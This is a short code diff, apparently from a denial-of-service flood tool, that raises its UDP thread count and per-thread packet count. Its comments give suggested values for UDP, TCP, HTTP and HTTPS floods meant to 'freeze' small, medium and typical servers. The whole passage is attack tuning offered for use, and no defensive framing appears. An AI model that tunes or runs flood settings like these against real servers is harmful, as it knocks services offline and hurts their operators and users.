@@ -203,7 +203,7 @@ executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
 # This controls how many concurrent threads will launch per attack per protocol.
 # More threads = more parallel pressure on the server.
 # Suggested values to try freezing small/medium servers:
-UDP_THREAD_COUNT = 10     # 🚀 150–300 for heavy UDP flood
+UDP_THREAD_COUNT = 200     # 🚀 150–300 for heavy UDP flood
 TCP_THREAD_COUNT = 10      # 💣 100–200 for connection flood
 HTTP_THREAD_COUNT = 10     # 🌐 50–150 for webserver overload
 HTTPS_THREAD_COUNT = 8     # 🔐 30–100 (HTTPS uses more CPU)
@@ -211,7 +211,7 @@ HTTPS_THREAD_COUNT = 8     # 🔐 30–100 (HTTPS uses more CPU)
 # 📦 Packet/Request Loop Count - PACKETS PER THREAD (Flood Volume)
 # Each thread will send this many packets or requests before restarting.
 # Suggested values to freeze a typical server (adjust if needed):
-PACKET_LOOP_COUNT_UDP = 3000     # 🔥 UDP: send thousands of packets fast
+PACKET_LOOP_COUNT_UDP = 5000    # 🔥 UDP: send thousands of packets fast
 PACKET_LOOP_COUNT_TCP = 2500      # 💥 TCP: send bursts of data over connections
 PACKET_LOOP_COUNT_HTTP = 2000     # 🌐 HTTP: send many GET requests
 PACKET_LOOP_COUNT_HTTPS = 1000    # 🔐 HTTPS: keep lower due to encryption overhead
